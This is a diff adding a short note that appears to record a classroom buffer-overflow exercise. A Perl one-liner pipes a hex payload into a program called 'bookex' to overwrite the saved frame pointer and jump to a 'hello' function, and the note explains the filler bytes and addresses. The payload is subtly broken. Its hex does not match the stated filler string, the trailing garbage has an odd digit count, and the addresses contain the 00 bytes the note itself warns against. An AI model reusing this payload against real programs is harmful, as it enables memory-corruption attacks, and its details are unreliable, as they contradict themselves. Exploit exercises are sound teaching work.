@@ -1,0 +1,11 @@
+perl -e 'print pack("H*", "414243444546474748485155565758616263666775b9110000bd110000a4e4e4e4e0a");' | ./bookex
+
+24 Bytes of content to fill buffer:
+ABCDEFGHQRSTUVWXabcdefgh
+
+saved frame pointer: 0x000011ba 
+
+hello function: 0x000011bd
+
+Garbage to fill last 4 bytes: a4e4e4e4e0a
+Cannot end these addresses with 00 or FF, it will not work
